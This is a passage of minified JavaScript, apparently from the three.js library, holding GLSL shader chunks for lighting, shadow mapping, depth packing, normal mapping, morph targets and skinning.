ReflectedLight reflectedLight ) {\\n\\t#ifndef STANDARD\\n\\t\\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\\n\\t\\tfloat dotNL = dotNV;\\n\\t\\tfloat clearCoatDHR = material.clearCoat * clearCoatDHRApprox( material.clearCoatRoughness, dotNL );\\n\\t#else\\n\\t\\tfloat clearCoatDHR = 0.0;\\n\\t#endif\\n\\treflectedLight.indirectSpecular += ( 1.0 - clearCoatDHR ) * radiance * BRDF_Specular_GGX_Environment( geometry, material.specularColor, material.specularRoughness );\\n\\t#ifndef STANDARD\\n\\t\\treflectedLight.indirectSpecular += clearCoatRadiance * material.clearCoat * BRDF_Specular_GGX_Environment( geometry, vec3( DEFAULT_SPECULAR_COEFFICIENT ), material.clearCoatRoughness );\\n\\t#endif\\n}\\n#define RE_Direct\\t\\t\\t\\tRE_Direct_Physical\\n#define RE_Direct_RectArea\\t\\tRE_Direct_RectArea_Physical\\n#define RE_IndirectDiffuse\\t\\tRE_IndirectDiffuse_Physical\\n#define RE_IndirectSpecular\\t\\tRE_IndirectSpecular_Physical\\n#define Material_BlinnShininessExponent( material )   GGXRoughnessToBlinnExponent( material.specularRoughness )\\n#define Material_ClearCoat_BlinnShininessExponent( material )   GGXRoughnessToBlinnExponent( material.clearCoatRoughness )\\nfloat computeSpecularOcclusion( const in float dotNV, const in float ambientOcclusion, const in float roughness ) {\\n\\treturn saturate( pow( dotNV + ambientOcclusion, exp2( - 16.0 * roughness - 1.0 ) ) - 1.0 + ambientOcclusion );\\n}\\n\",\nlights_template:\"\\nGeometricContext geometry;\\ngeometry.position = - vViewPosition;\\ngeometry.normal = normal;\\ngeometry.viewDir = normalize( vViewPosition );\\nIncidentLight directLight;\\n#if ( NUM_POINT_LIGHTS > 0 ) && defined( RE_Direct )\\n\\tPointLight pointLight;\\n\\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\\n\\t\\tpointLight = pointLights[ i ];\\n\\t\\tgetPointDirectLightIrradiance( pointLight, geometry, directLight );\\n\\t\\t#ifdef USE_SHADOWMAP\\n\\t\\tdirectLight.color *= all( bvec2( pointLight.shadow, directLight.visible ) ) ? getPointShadow( pointShadowMap[ i ], pointLight.shadowMapSize, pointLight.shadowBias, pointLight.shadowRadius, vPointShadowCoord[ i ] ) : 1.0;\\n\\t\\t#endif\\n\\t\\tRE_Direct( directLight, geometry, material, reflectedLight );\\n\\t}\\n#endif\\n#if ( NUM_SPOT_LIGHTS > 0 ) && defined( RE_Direct )\\n\\tSpotLight spotLight;\\n\\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\\n\\t\\tspotLight = spotLights[ i ];\\n\\t\\tgetSpotDirectLightIrradiance( spotLight, geometry, directLight );\\n\\t\\t#ifdef USE_SHADOWMAP\\n\\t\\tdirectLight.color *= all( bvec2( spotLight.shadow, directLight.visible ) ) ? getShadow( spotShadowMap[ i ], spotLight.shadowMapSize, spotLight.shadowBias, spotLight.shadowRadius, vSpotShadowCoord[ i ] ) : 1.0;\\n\\t\\t#endif\\n\\t\\tRE_Direct( directLight, geometry, material, reflectedLight );\\n\\t}\\n#endif\\n#if ( NUM_DIR_LIGHTS > 0 ) && defined( RE_Direct )\\n\\tDirectionalLight directionalLight;\\n\\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\\n\\t\\tdirectionalLight = directionalLights[ i ];\\n\\t\\tgetDirectionalDirectLightIrradiance( directionalLight, geometry, directLight );\\n\\t\\t#ifdef USE_SHADOWMAP\\n\\t\\tdirectLight.color *= all( bvec2( directionalLight.shadow, directLight.visible ) ) ? getShadow( directionalShadowMap[ i ], directionalLight.shadowMapSize, directionalLight.shadowBias, directionalLight.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;\\n\\t\\t#endif\\n\\t\\tRE_Direct( directLight, geometry, material, reflectedLight );\\n\\t}\\n#endif\\n#if ( NUM_RECT_AREA_LIGHTS > 0 ) && defined( RE_Direct_RectArea )\\n\\tRectAreaLight rectAreaLight;\\n\\tfor ( int i = 0; i < NUM_RECT_AREA_LIGHTS; i ++ ) {\\n\\t\\trectAreaLight = rectAreaLights[ i ];\\n\\t\\tRE_Direct_RectArea( rectAreaLight, geometry, material, reflectedLight );\\n\\t}\\n#endif\\n#if defined( RE_IndirectDiffuse )\\n\\tvec3 irradiance = getAmbientLightIrradiance( ambientLightColor );\\n\\t#ifdef USE_LIGHTMAP\\n\\t\\tvec3 lightMapIrradiance = texture2D( lightMap, vUv2 ).xyz * lightMapIntensity;\\n\\t\\t#ifndef PHYSICALLY_CORRECT_LIGHTS\\n\\t\\t\\tlightMapIrradiance *= PI;\\n\\t\\t#endif\\n\\t\\tirradiance += lightMapIrradiance;\\n\\t#endif\\n\\t#if ( NUM_HEMI_LIGHTS > 0 )\\n\\t\\tfor ( int i = 0; i < NUM_HEMI_LIGHTS; i ++ ) {\\n\\t\\t\\tirradiance += getHemisphereLightIrradiance( hemisphereLights[ i ], geometry );\\n\\t\\t}\\n\\t#endif\\n\\t#if defined( USE_ENVMAP ) && defined( PHYSICAL ) && defined( ENVMAP_TYPE_CUBE_UV )\\n\\t\\tirradiance += getLightProbeIndirectIrradiance( geometry, 8 );\\n\\t#endif\\n\\tRE_IndirectDiffuse( irradiance, geometry, material, reflectedLight );\\n#endif\\n#if defined( USE_ENVMAP ) && defined( RE_IndirectSpecular )\\n\\tvec3 radiance = getLightProbeIndirectRadiance( geometry, Material_BlinnShininessExponent( material ), 8 );\\n\\t#ifndef STANDARD\\n\\t\\tvec3 clearCoatRadiance = getLightProbeIndirectRadiance( geometry, Material_ClearCoat_BlinnShininessExponent( material ), 8 );\\n\\t#else\\n\\t\\tvec3 clearCoatRadiance = vec3( 0.0 );\\n\\t#endif\\n\\tRE_IndirectSpecular( radiance, clearCoatRadiance, geometry, material, reflectedLight );\\n#endif\\n\",\nlogdepthbuf_fragment:\"#if defined(USE_LOGDEPTHBUF) && defined(USE_LOGDEPTHBUF_EXT)\\n\\tgl_FragDepthEXT = log2(vFragDepth) * logDepthBufFC * 0.5;\\n#endif\",logdepthbuf_pars_fragment:\"#ifdef USE_LOGDEPTHBUF\\n\\tuniform float logDepthBufFC;\\n\\t#ifdef USE_LOGDEPTHBUF_EXT\\n\\t\\tvarying float vFragDepth;\\n\\t#endif\\n#endif\\n\",logdepthbuf_pars_vertex:\"#ifdef USE_LOGDEPTHBUF\\n\\t#ifdef USE_LOGDEPTHBUF_EXT\\n\\t\\tvarying float vFragDepth;\\n\\t#endif\\n\\tuniform float logDepthBufFC;\\n#endif\",logdepthbuf_vertex:\"#ifdef USE_LOGDEPTHBUF\\n\\tgl_Position.z = log2(max( EPSILON, gl_Position.w + 1.0 )) * logDepthBufFC;\\n\\t#ifdef USE_LOGDEPTHBUF_EXT\\n\\t\\tvFragDepth = 1.0 + gl_Position.w;\\n\\t#else\\n\\t\\tgl_Position.z = (gl_Position.z - 1.0) * gl_Position.w;\\n\\t#endif\\n#endif\\n\",\nmap_fragment:\"#ifdef USE_MAP\\n\\tvec4 texelColor = texture2D( map, vUv );\\n\\ttexelColor = mapTexelToLinear( texelColor );\\n\\tdiffuseColor *= texelColor;\\n#endif\\n\",map_pars_fragment:\"#ifdef USE_MAP\\n\\tuniform sampler2D map;\\n#endif\\n\",map_particle_fragment:\"#ifdef USE_MAP\\n\\tvec4 mapTexel = texture2D( map, vec2( gl_PointCoord.x, 1.0 - gl_PointCoord.y ) * offsetRepeat.zw + offsetRepeat.xy );\\n\\tdiffuseColor *= mapTexelToLinear( mapTexel );\\n#endif\\n\",map_particle_pars_fragment:\"#ifdef USE_MAP\\n\\tuniform vec4 offsetRepeat;\\n\\tuniform sampler2D map;\\n#endif\\n\",\nmetalnessmap_fragment:\"float metalnessFactor = metalness;\\n#ifdef USE_METALNESSMAP\\n\\tvec4 texelMetalness = texture2D( metalnessMap, vUv );\\n\\tmetalnessFactor *= texelMetalness.r;\\n#endif\\n\",metalnessmap_pars_fragment:\"#ifdef USE_METALNESSMAP\\n\\tuniform sampler2D metalnessMap;\\n#endif\",morphnormal_vertex:\"#ifdef USE_MORPHNORMALS\\n\\tobjectNormal += ( morphNormal0 - normal ) * morphTargetInfluences[ 0 ];\\n\\tobjectNormal += ( morphNormal1 - normal ) * morphTargetInfluences[ 1 ];\\n\\tobjectNormal += ( morphNormal2 - normal ) * morphTargetInfluences[ 2 ];\\n\\tobjectNormal += ( morphNormal3 - normal ) * morphTargetInfluences[ 3 ];\\n#endif\\n\",\nmorphtarget_pars_vertex:\"#ifdef USE_MORPHTARGETS\\n\\t#ifndef USE_MORPHNORMALS\\n\\tuniform float morphTargetInfluences[ 8 ];\\n\\t#else\\n\\tuniform float morphTargetInfluences[ 4 ];\\n\\t#endif\\n#endif\",morphtarget_vertex:\"#ifdef USE_MORPHTARGETS\\n\\ttransformed += ( morphTarget0 - position ) * morphTargetInfluences[ 0 ];\\n\\ttransformed += ( morphTarget1 - position ) * morphTargetInfluences[ 1 ];\\n\\ttransformed += ( morphTarget2 - position ) * morphTargetInfluences[ 2 ];\\n\\ttransformed += ( morphTarget3 - position ) * morphTargetInfluences[ 3 ];\\n\\t#ifndef USE_MORPHNORMALS\\n\\ttransformed += ( morphTarget4 - position ) * morphTargetInfluences[ 4 ];\\n\\ttransformed += ( morphTarget5 - position ) * morphTargetInfluences[ 5 ];\\n\\ttransformed += ( morphTarget6 - position ) * morphTargetInfluences[ 6 ];\\n\\ttransformed += ( morphTarget7 - position ) * morphTargetInfluences[ 7 ];\\n\\t#endif\\n#endif\\n\",\nnormal_flip:\"#ifdef DOUBLE_SIDED\\n\\tfloat flipNormal = ( float( gl_FrontFacing ) * 2.0 - 1.0 );\\n#else\\n\\tfloat flipNormal = 1.0;\\n#endif\\n\",normal_fragment:\"#ifdef FLAT_SHADED\\n\\tvec3 fdx = vec3( dFdx( vViewPosition.x ), dFdx( vViewPosition.y ), dFdx( vViewPosition.z ) );\\n\\tvec3 fdy = vec3( dFdy( vViewPosition.x ), dFdy( vViewPosition.y ), dFdy( vViewPosition.z ) );\\n\\tvec3 normal = normalize( cross( fdx, fdy ) );\\n#else\\n\\tvec3 normal = normalize( vNormal ) * flipNormal;\\n#endif\\n#ifdef USE_NORMALMAP\\n\\tnormal = perturbNormal2Arb( -vViewPosition, normal );\\n#elif defined( USE_BUMPMAP )\\n\\tnormal = perturbNormalArb( -vViewPosition, normal, dHdxy_fwd() );\\n#endif\\n\",\nnormalmap_pars_fragment:\"#ifdef USE_NORMALMAP\\n\\tuniform sampler2D normalMap;\\n\\tuniform vec2 normalScale;\\n\\tvec3 perturbNormal2Arb( vec3 eye_pos, vec3 surf_norm ) {\\n\\t\\tvec3 q0 = dFdx( eye_pos.xyz );\\n\\t\\tvec3 q1 = dFdy( eye_pos.xyz );\\n\\t\\tvec2 st0 = dFdx( vUv.st );\\n\\t\\tvec2 st1 = dFdy( vUv.st );\\n\\t\\tvec3 S = normalize( q0 * st1.t - q1 * st0.t );\\n\\t\\tvec3 T = normalize( -q0 * st1.s + q1 * st0.s );\\n\\t\\tvec3 N = normalize( surf_norm );\\n\\t\\tvec3 mapN = texture2D( normalMap, vUv ).xyz * 2.0 - 1.0;\\n\\t\\tmapN.xy = normalScale * mapN.xy;\\n\\t\\tmat3 tsn = mat3( S, T, N );\\n\\t\\treturn normalize( tsn * mapN );\\n\\t}\\n#endif\\n\",\npacking:\"vec3 packNormalToRGB( const in vec3 normal ) {\\n\\treturn normalize( normal ) * 0.5 + 0.5;\\n}\\nvec3 unpackRGBToNormal( const in vec3 rgb ) {\\n\\treturn 1.0 - 2.0 * rgb.xyz;\\n}\\nconst float PackUpscale = 256. / 255.;const float UnpackDownscale = 255. / 256.;\\nconst vec3 PackFactors = vec3( 256. * 256. * 256., 256. * 256.,  256. );\\nconst vec4 UnpackFactors = UnpackDownscale / vec4( PackFactors, 1. );\\nconst float ShiftRight8 = 1. / 256.;\\nvec4 packDepthToRGBA( const in float v ) {\\n\\tvec4 r = vec4( fract( v * PackFactors ), v );\\n\\tr.yzw -= r.xyz * ShiftRight8;\\treturn r * PackUpscale;\\n}\\nfloat unpackRGBAToDepth( const in vec4 v ) {\\n\\treturn dot( v, UnpackFactors );\\n}\\nfloat viewZToOrthographicDepth( const in float viewZ, const in float near, const in float far ) {\\n\\treturn ( viewZ + near ) / ( near - far );\\n}\\nfloat orthographicDepthToViewZ( const in float linearClipZ, const in float near, const in float far ) {\\n\\treturn linearClipZ * ( near - far ) - near;\\n}\\nfloat viewZToPerspectiveDepth( const in float viewZ, const in float near, const in float far ) {\\n\\treturn (( near + viewZ ) * far ) / (( far - near ) * viewZ );\\n}\\nfloat perspectiveDepthToViewZ( const in float invClipZ, const in float near, const in float far ) {\\n\\treturn ( near * far ) / ( ( far - near ) * invClipZ - far );\\n}\\n\",\npremultiplied_alpha_fragment:\"#ifdef PREMULTIPLIED_ALPHA\\n\\tgl_FragColor.rgb *= gl_FragColor.a;\\n#endif\\n\",project_vertex:\"#ifdef USE_SKINNING\\n\\tvec4 mvPosition = modelViewMatrix * skinned;\\n#else\\n\\tvec4 mvPosition = modelViewMatrix * vec4( transformed, 1.0 );\\n#endif\\ngl_Position = projectionMatrix * mvPosition;\\n\",roughnessmap_fragment:\"float roughnessFactor = roughness;\\n#ifdef USE_ROUGHNESSMAP\\n\\tvec4 texelRoughness = texture2D( roughnessMap, vUv );\\n\\troughnessFactor *= texelRoughness.r;\\n#endif\\n\",\nroughnessmap_pars_fragment:\"#ifdef USE_ROUGHNESSMAP\\n\\tuniform sampler2D roughnessMap;\\n#endif\",shadowmap_pars_fragment:\"#ifdef USE_SHADOWMAP\\n\\t#if NUM_DIR_LIGHTS > 0\\n\\t\\tuniform sampler2D directionalShadowMap[ NUM_DIR_LIGHTS ];\\n\\t\\tvarying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHTS ];\\n\\t#endif\\n\\t#if NUM_SPOT_LIGHTS > 0\\n\\t\\tuniform sampler2D spotShadowMap[ NUM_SPOT_LIGHTS ];\\n\\t\\tvarying vec4 vSpotShadowCoord[ NUM_SPOT_LIGHTS ];\\n\\t#endif\\n\\t#if NUM_POINT_LIGHTS > 0\\n\\t\\tuniform sampler2D pointShadowMap[ NUM_POINT_LIGHTS ];\\n\\t\\tvarying vec4 vPointShadowCoord[ NUM_POINT_LIGHTS ];\\n\\t#endif\\n\\tfloat texture2DCompare( sampler2D depths, vec2 uv, float compare ) {\\n\\t\\treturn step( compare, unpackRGBAToDepth( texture2D( depths, uv ) ) );\\n\\t}\\n\\tfloat texture2DShadowLerp( sampler2D depths, vec2 size, vec2 uv, float compare ) {\\n\\t\\tconst vec2 offset = vec2( 0.0, 1.0 );\\n\\t\\tvec2 texelSize = vec2( 1.0 ) / size;\\n\\t\\tvec2 centroidUV = floor( uv * size + 0.5 ) / size;\\n\\t\\tfloat lb = texture2DCompare( depths, centroidUV + texelSize * offset.xx, compare );\\n\\t\\tfloat lt = texture2DCompare( depths, centroidUV + texelSize * offset.xy, compare );\\n\\t\\tfloat rb = texture2DCompare( depths, centroidUV + texelSize * offset.yx, compare );\\n\\t\\tfloat rt = texture2DCompare( depths, centroidUV + texelSize * offset.yy, compare );\\n\\t\\tvec2 f = fract( uv * size + 0.5 );\\n\\t\\tfloat a = mix( lb, lt, f.y );\\n\\t\\tfloat b = mix( rb, rt, f.y );\\n\\t\\tfloat c = mix( a, b, f.x );\\n\\t\\treturn c;\\n\\t}\\n\\tfloat getShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowBias, float shadowRadius, vec4 shadowCoord ) {\\n\\t\\tshadowCoord.xyz /= shadowCoord.w;\\n\\t\\tshadowCoord.z += shadowBias;\\n\\t\\tbvec4 inFrustumVec = bvec4 ( shadowCoord.x >= 0.0, shadowCoord.x <= 1.0, shadowCoord.y >= 0.0, shadowCoord.y <= 1.0 );\\n\\t\\tbool inFrustum = all( inFrustumVec );\\n\\t\\tbvec2 frustumTestVec = bvec2( inFrustum, shadowCoord.z <= 1.0 );\\n\\t\\tbool frustumTest = all( frustumTestVec );\\n\\t\\tif ( frustumTest ) {\\n\\t\\t#if defined( SHADOWMAP_TYPE_PCF )\\n\\t\\t\\tvec2 texelSize = vec2( 1.0 ) / shadowMapSize;\\n\\t\\t\\tfloat dx0 = - texelSize.x * shadowRadius;\\n\\t\\t\\tfloat dy0 = - texelSize.y * shadowRadius;\\n\\t\\t\\tfloat dx1 = + texelSize.x * shadowRadius;\\n\\t\\t\\tfloat dy1 = + texelSize.y * shadowRadius;\\n\\t\\t\\treturn (\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, 0.0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy, shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, 0.0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, dy1 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy1 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, dy1 ), shadowCoord.z )\\n\\t\\t\\t) * ( 1.0 / 9.0 );\\n\\t\\t#elif defined( SHADOWMAP_TYPE_PCF_SOFT )\\n\\t\\t\\tvec2 texelSize = vec2( 1.0 ) / shadowMapSize;\\n\\t\\t\\tfloat dx0 = - texelSize.x * shadowRadius;\\n\\t\\t\\tfloat dy0 = - texelSize.y * shadowRadius;\\n\\t\\t\\tfloat dx1 = + texelSize.x * shadowRadius;\\n\\t\\t\\tfloat dy1 = + texelSize.y * shadowRadius;\\n\\t\\t\\treturn (\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx0, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( 0.0, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx1, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx0, 0.0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy, shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx1, 0.0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx0, dy1 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( 0.0, dy1 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx1, dy1 ), shadowCoord.z )\\n\\t\\t\\t) * ( 1.0 / 9.0 );\\n\\t\\t#else\\n\\t\\t\\treturn texture2DCompare( shadowMap, shadowCoord.xy, shadowCoord.z );\\n\\t\\t#endif\\n\\t\\t}\\n\\t\\treturn 1.0;\\n\\t}\\n\\tvec2 cubeToUV( vec3 v, float texelSizeY ) {\\n\\t\\tvec3 absV = abs( v );\\n\\t\\tfloat scaleToCube = 1.0 / max( absV.x, max( absV.y, absV.z ) );\\n\\t\\tabsV *= scaleToCube;\\n\\t\\tv *= scaleToCube * ( 1.0 - 2.0 * texelSizeY );\\n\\t\\tvec2 planar = v.xy;\\n\\t\\tfloat almostATexel = 1.5 * texelSizeY;\\n\\t\\tfloat almostOne = 1.0 - almostATexel;\\n\\t\\tif ( absV.z >= almostOne ) {\\n\\t\\t\\tif ( v.z > 0.0 )\\n\\t\\t\\t\\tplanar.x = 4.0 - v.x;\\n\\t\\t} else if ( absV.x >= almostOne ) {\\n\\t\\t\\tfloat signX = sign( v.x );\\n\\t\\t\\tplanar.x = v.z * signX + 2.0 * signX;\\n\\t\\t} else if ( absV.y >= almostOne ) {\\n\\t\\t\\tfloat signY = sign( v.y );\\n\\t\\t\\tplanar.x = v.x + 2.0 * signY + 2.0;\\n\\t\\t\\tplanar.y = v.z * signY - 2.0;\\n\\t\\t}\\n\\t\\treturn vec2( 0.125, 0.25 ) * planar + vec2( 0.375, 0.75 );\\n\\t}\\n\\tfloat getPointShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowBias, float shadowRadius, vec4 shadowCoord ) {\\n\\t\\tvec2 texelSize = vec2( 1.0 ) / ( shadowMapSize * vec2( 4.0, 2.0 ) );\\n\\t\\tvec3 lightToPosition = shadowCoord.xyz;\\n\\t\\tvec3 bd3D = normalize( lightToPosition );\\n\\t\\tfloat dp = ( length( lightToPosition ) - shadowBias ) / 1000.0;\\n\\t\\t#if defined( SHADOWMAP_TYPE_PCF ) || defined( SHADOWMAP_TYPE_PCF_SOFT )\\n\\t\\t\\tvec2 offset = vec2( - 1, 1 ) * shadowRadius * texelSize.y;\\n\\t\\t\\treturn (\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xyy, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yyy, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xyx, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yyx, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xxy, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yxy, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xxx, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yxx, texelSize.y ), dp )\\n\\t\\t\\t) * ( 1.0 / 9.0 );\\n\\t\\t#else\\n\\t\\t\\treturn texture2DCompare( shadowMap, cubeToUV( bd3D, texelSize.y ), dp );\\n\\t\\t#endif\\n\\t}\\n#endif\\n\",\nshadowmap_pars_vertex:\"#ifdef USE_SHADOWMAP\\n\\t#if NUM_DIR_LIGHTS > 0\\n\\t\\tuniform mat4 directionalShadowMatrix[ NUM_DIR_LIGHTS ];\\n\\t\\tvarying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHTS ];\\n\\t#endif\\n\\t#if NUM_SPOT_LIGHTS > 0\\n\\t\\tuniform mat4 spotShadowMatrix[ NUM_SPOT_LIGHTS ];\\n\\t\\tvarying vec4 vSpotShadowCoord[ NUM_SPOT_LIGHTS ];\\n\\t#endif\\n\\t#if NUM_POINT_LIGHTS > 0\\n\\t\\tuniform mat4 pointShadowMatrix[ NUM_POINT_LIGHTS ];\\n\\t\\tvarying vec4 vPointShadowCoord[ NUM_POINT_LIGHTS ];\\n\\t#endif\\n#endif\\n\",\nshadowmap_vertex:\"#ifdef USE_SHADOWMAP\\n\\t#if NUM_DIR_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\\n\\t\\tvDirectionalShadowCoord[ i ] = directionalShadowMatrix[ i ] * worldPosition;\\n\\t}\\n\\t#endif\\n\\t#if NUM_SPOT_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\\n\\t\\tvSpotShadowCoord[ i ] = spotShadowMatrix[ i ] * worldPosition;\\n\\t}\\n\\t#endif\\n\\t#if NUM_POINT_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\\n\\t\\tvPointShadowCoord[ i ] = pointShadowMatrix[ i ] * worldPosition;\\n\\t}\\n\\t#endif\\n#endif\\n\",\nshadowmask_pars_fragment:\"float getShadowMask() {\\n\\tfloat shadow = 1.0;\\n\\t#ifdef USE_SHADOWMAP\\n\\t#if NUM_DIR_LIGHTS > 0\\n\\tDirectionalLight directionalLight;\\n\\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\\n\\t\\tdirectionalLight = directionalLights[ i ];\\n\\t\\tshadow *= bool( directionalLight.shadow ) ? getShadow( directionalShadowMap[ i ], directionalLight.shadowMapSize, directionalLight.shadowBias, directionalLight.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;\\n\\t}\\n\\t#endif\\n\\t#if NUM_SPOT_LIGHTS > 0\\n\\tSpotLight spotLight;\\n\\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\\n\\t\\tspotLight = spotLights[ i ];\\n\\t\\tshadow *= bool( spotLight.shadow ) ? getShadow( spotShadowMap[ i ], spotLight.shadowMapSize, spotLight.shadowBias, spotLight.shadowRadius, vSpotShadowCoord[ i ] ) : 1.0;\\n\\t}\\n\\t#endif\\n\\t#if NUM_POINT_LIGHTS > 0\\n\\tPointLight pointLight;\\n\\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\\n\\t\\tpointLight = pointLights[ i ];\\n\\t\\tshadow *= bool( pointLight.shadow ) ? getPointShadow( pointShadowMap[ i ], pointLight.shadowMapSize, pointLight.shadowBias, pointLight.shadowRadius, vPointShadowCoord[ i ] ) : 1.0;\\n\\t}\\n\\t#endif\\n\\t#endif\\n\\treturn shadow;\\n}\\n\",\nskinbase_vertex:\"#ifdef USE_SKINNING\\n\\tmat4 boneMatX = getBoneMatrix( skinIndex.x );\\n\\tmat4 boneMatY = getBoneMatrix( skinIndex.y );\\n\\tmat4 boneMatZ = getBoneMatrix( skinIndex.z );\\n\\tmat4 boneMatW = getBoneMatrix( skinIndex.w );\\n#endif\",skinning_pars_vertex:\"#ifdef USE_SKINNING\\n\\tuniform mat4 bindMatrix;\\n\\tuniform mat4 bindMatrixInverse;\\n\\t#ifdef BONE_TEXTURE\\n\\t\\tuniform sampler2D boneTexture;\\n\\t\\tuniform int boneTextureWidth;\\n\\t\\tuniform int boneTextureHeight;\\n\\t\\tmat4 getBoneMatrix( const in float i ) {\\n\\t\\t\\tfloat j = i * 4.0;\\n\\t\\t\\tfloat x = mod( j, float( boneTextureWidth ) );\\n\\t\\t\\tfloat y = floor( j / float( boneTextureWidth ) );\\n\\t\\t\\tfloat dx = 1.0 / float( boneTextureWidth );\\n\\t\\t\\tfloat dy = 1.0 / float( boneTextureHeight );\\n\\t\\t\\ty = dy * ( y + 0.5 );\\n\\t\\t\\tvec4 v1 = texture2D( boneTexture, vec2( dx * ( x + 0.5 ), y ) );\\n\\t\\t\\tvec4 v2 = texture2D( boneTexture, vec2( dx * ( x + 1.5 ), y ) );\\n\\t\\t\\tvec4 v3 = texture2D( boneTexture, vec2( dx * ( x + 2.5 ), y ) );\\n\\t\\t\\tvec4 v4 = texture2D( boneTexture, vec2( dx * ( x + 3.5 ), y ) );\\n\\t\\t\\tmat4 bone = mat4( v1, v2, v3, v4 );\\n\\t\\t\\treturn bone;\\n\\t\\t}\\n\\t#else\\n\\t\\tuniform mat4 boneMatrices[ MAX_BONES ];\\n\\t\\tmat4 getBoneMatrix( const in float i ) {\\n\\t\\t\\tmat4 bone = boneMatrices[ int(i) ];\\n\\t\\t\\treturn bone;\\n\\t\\t}\\n\\t#endif\\n#endif\\n\",\nskinning_vertex:\"#ifdef USE_SKINNING\\n\\tvec4 skinVertex = bindMatrix * vec4( transformed, 1.0 );\\n\\tvec4 skinned = vec4( 0.0 );\\n\\tskinned += boneMatX * skinVertex * skinWeight.x;\\n\\tskinned += boneMatY * skinVertex * skinWeight.y;\\n\\tskinned += boneMatZ * skinVertex * skinWeight.z;\\n\\tskinned += boneMatW * skinVertex * skinWeight.w;\\n\\tskinned  = bindMatrixInverse * skinned;\\n#endif\\n\",skinnormal_vertex:\"#ifdef USE_SKINNING\\n\\tmat4 skinMatrix = mat4( 0.0 );\\n\\tskinMatrix += skinWeight.x * boneMatX;\\n\\tskinMatrix += skinWeight.y * boneMatY;\\n\\tskinMatrix += skinWeight.z * boneMatZ;\\n\\tskinMatrix += skinWeight.w * boneMatW;\\n\\tskinMatrix  = bindMatrixInverse * skinMatrix * bindMatrix;\\n\\tobjectNormal = vec4( skinMatrix * vec4( objectNormal, 0.0 ) ).xyz;\\n#endif\\n\",\nspecularmap_fragment:\"float specularStrength;\\n#ifdef USE_SPECULARMAP\\n\\tvec4 texelSpecular = texture2D( specularMap, vUv );\\n\\tspecularStrength = texelSpecular.r;\\n#else\\n\\tspecularStrength = 1.0;\\n#endif\",specularmap_pars_fragment:\"#ifdef USE_SPECULARMAP\\n\\tuniform sampler2D specularMap;\\n#endif\",tonemapping_fragment:\"#if defined( TONE_MAPPING )\\n  gl_FragColor.rgb = toneMapping( gl_FragColor.rgb );\\n#endif\\n\",tonemapping_pars_fragment:\"#define 